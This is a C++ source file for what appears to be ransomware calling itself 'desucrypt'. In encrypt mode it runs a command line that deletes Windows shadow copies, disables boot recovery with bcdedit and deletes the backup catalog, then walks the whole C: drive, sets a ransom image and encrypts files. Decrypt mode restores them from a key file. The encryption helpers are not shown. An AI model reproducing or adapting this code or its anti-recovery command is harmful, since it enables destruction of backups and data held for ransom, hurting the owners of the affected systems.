
#include "stdafx.h"

int main(int argc, char **argv)
{
	BOOL action;
	std::string prgName(argv[0]);
	prgName = prgName.substr(prgName.find_last_of("\\") + 1);
	if (argc < 2) {
		std::cout << "insufficient amount of arguments" << std::endl;
		std::cout << "Usage: " << prgName << " encrypt/decrypt" << std::endl;
		return -1;
	}
	else {
		std::string decision(argv[1]);
		std::cout << argv[1] << std::endl;
		if (decision == "encrypt") {
			action = TRUE;
		}
		else if (decision == "decrypt") {
			action = FALSE;
		}
		else {
			std::cout << "Usage: " << prgName << " encrypt/decrypt" << std::endl;
			//system("pause");
			return -1;
		}
	}
	if (action == TRUE) {
		crypt CryptObj;
		filesystem fsObj;
		ShellExecute(
			NULL,
			L"helper.exe",
			L"cmd.exe / c vssadmin delete shadows / all / quiet & wmic shadowcopy delete & bcdedit / set{ default } bootstatuspolicy ignoreallfailures & bcdedit / set{ default } recoveryenabled no & wbadmin delete catalog - quiet",
			NULL, NULL, 0);
		fsObj.rWalking(L"C:\\", true);
		putImage();
		
		std::cout << "files were collected" << std::endl << "Encrypting..." << std::endl;
		CryptObj.initializeContainer();
		fsObj.iterateFilesDB(action);
		CryptObj.writeKeyToFile();
		CryptObj.destroyKeys();
	}
	if (action == FALSE) {
		BOOL callResult;
		crypt CryptObj;
		filesystem fsObj;
		callResult = CryptObj.importKeyFromFile();
		
		if (callResult == FALSE) {
			std::cout << "failed" << std::endl;
			return -1;
		}
		fsObj.searchForEncryptedFiles(L"C:\\", true);
		std::cout << "files were collected" << std::endl << "Decrypting..." << std::endl;
		fsObj.iterateFilesDB(action);
		//decryptProcedure(L"C:\\Users\\delta\\desktop\\cryptorTest\\ayaya.webm.desucrpt");
		DeleteFile(L"C:\\desucryptKeyContainer.info");
		DeleteFile(L"C:\\DESUCRYPTinfo.jpg");
	}
    return 0;
}

